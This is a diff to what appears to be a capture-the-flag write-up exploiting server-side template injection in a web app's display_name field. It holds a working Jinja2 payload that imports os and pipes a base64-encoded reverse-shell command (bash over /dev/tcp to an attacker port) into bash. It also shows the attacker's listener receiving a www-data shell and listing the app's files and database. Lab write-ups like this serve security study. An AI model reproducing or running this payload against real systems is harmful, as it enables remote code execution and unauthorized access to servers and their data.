@@ -277,10 +277,38 @@ Cookie: session=.eJxFjk0KgzAQha8is1HBigotxQsUuvUAIZqoQ_MjybgoIXdvtJSu5nsfD94EEOg
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
-display_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuODMuMjU1LzEzMzcgMD4mMQ== | base64 -d | bash').read() }}
+display_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuODMuMjU1LzEzMzcgMD4mMQ== | base64 -d | bash').read() }}
 ```
 
 Ill put the base64 encoded payload in, then base64 decode it then run it with bash
 
 Ill URL encode the full string and send the request
+
+```python
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.200.83.255
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => a979c559ed66 10.0.16.132 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/local/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/a979c559ed66~10.0.16.132-Linux-x86_64/2026_08_21-17_21_55-457.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+bash: /root/.bashrc: Permission denied
+www-data@a979c559ed66:/app/app$ ls -al
+total 80
+drwxrwxrwx 1 www-data www-data  4096 Aug 11 04:14 .
+drwxrwxrwx 1 www-data www-data  4096 Aug 11 04:46 ..
+drwxrwxr-x 1 www-data www-data  4096 Aug 21 15:28 __pycache__
+-rw-rw-r-- 1 www-data www-data  4639 Aug 11 04:14 app.py
+-rw-rw-r-- 1 www-data www-data  4300 Aug  9 22:30 database.py
+-rw-rw-rw- 1 www-data www-data 24576 Aug  9 22:30 resort.db
+drwxrwxr-x 1 www-data www-data  4096 Aug 11 03:28 static
+drwxrwxr-x 1 www-data www-data  4096 Aug 11 03:28 templates
+www-data@a979c559ed66:/app/app$ whoami
+www-data
+www-data@a979c559ed66:/app/app$
+```
+
+I now have a reverse shell
 
